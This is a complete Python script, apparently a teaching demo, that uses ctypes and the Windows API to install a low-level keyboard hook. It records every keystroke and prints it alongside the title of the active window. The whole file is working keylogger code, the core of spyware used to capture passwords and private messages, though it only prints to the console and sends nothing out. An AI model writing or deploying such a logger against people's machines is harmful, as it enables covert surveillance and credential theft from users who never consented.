from ctypes import *
from ctypes.wintypes import *

# Custom type definitions for clarity
ULONG_PTR = c_ulonglong #  Use with 64-bit Python interpreter
#ULONG_PTR = c_ulong #  Use with 32-bit Python interpreter
LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SHIFT = 0x10

# Structure to capture keyboard input
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [('vkCode', DWORD),
                ('scanCode', DWORD),
                ('flags', DWORD),
                ('time', DWORD),
                ('dwExtraInfo', ULONG_PTR)]

# Load user32.dll
user32 = WinDLL('user32', use_last_error=True)

# Define keyboard state array type
KeyboardStateArray = BYTE * 256

# Variable to keep track of the last active window
last_active_window = None

# Function prototypes
user32.GetForegroundWindow.restype = HWND

user32.GetWindowTextLengthA.argtypes = [HWND]
user32.GetWindowTextLengthA.restype = INT

user32.GetWindowTextA.argtypes = [HWND, LPSTR, INT]
user32.GetWindowTextA.restype = INT

user32.GetKeyState.argtypes = [INT]
user32.GetKeyState.restype = SHORT

user32.GetKeyboardState.argtypes = [POINTER(KeyboardStateArray)]
user32.GetKeyboardState.restype = BOOL

user32.ToAscii.argtypes = [UINT, UINT, POINTER(KeyboardStateArray), LPWORD, UINT]
user32.ToAscii.restype = INT

user32.CallNextHookEx.argtypes = [HHOOK, INT, WPARAM, LPARAM]
user32.CallNextHookEx.restype = LRESULT

HOOKPROC = CFUNCTYPE(LRESULT, INT, WPARAM, LPARAM)

user32.SetWindowsHookExA.argtypes = [INT, HOOKPROC, HINSTANCE, DWORD]
user32.SetWindowsHookExA.restype = HHOOK

user32.GetMessageA.argtypes = [LPMSG, HWND, UINT, UINT]
user32.GetMessageA.restype = BOOL

# Function to get the name of the currently active (foreground) window.
def get_foreground_window_name():
    hwnd = user32.GetForegroundWindow()  # Gets handle to the foreground window.
    length = user32.GetWindowTextLengthA(hwnd)  # Gets the length of the window's title.
    buff = create_string_buffer(length + 1)  # Prepares a buffer for the window's title.
    user32.GetWindowTextA(hwnd, buff, length + 1)  # Retrieves the window's title.
    return buff.value  # Returns the title as a string.

# Demonstrates retrieving the name of the foreground window.
print(get_foreground_window_name())

# Hook function to process keyboard events.
def hook_function(nCode, wParam, lParam):
    global last_active_window  # Keeps track of the last active window title.

    current_window = get_foreground_window_name()  # Get the current active window's title.
    # Check if the active window has changed since the last key event.
    if last_active_window != current_window:
        last_active_window = current_window  # Update the last active window.
        # Print the new active window title.
        print("\n[{}]".format(current_window.decode("latin-1")))

    # If the event is a key down action, process it.
    if wParam == WM_KEYDOWN:
        kb_data = KBDLLHOOKSTRUCT.from_address(lParam)  # Extract keyboard data from the event.
        
        # Prepare to retrieve the current keyboard state.
        state = KeyboardStateArray()
        user32.GetKeyState(WM_SHIFT)  # Update the state of the SHIFT key.
        user32.GetKeyboardState(byref(state))  # Get the current keyboard state.
        
        # Attempt to translate the key press to an ASCII character.
        trans_char = (c_ushort * 1)()
        user32.ToAscii(kb_data.vkCode, kb_data.scanCode, state, trans_char, 0)

        # If a character was successfully translated, print it.
        if trans_char[0]:
            key_char = chr(trans_char[0])
            print(key_char, end="", flush=True)

    # Pass the event to the next hook in the chain.
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

# Prepare and install the low-level keyboard hook.
callback = HOOKPROC(hook_function)
keyboard_hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, None, 0)

# Enter message loop to keep the hook active
msg = MSG()
user32.GetMessageA(byref(msg), None, 0, 0)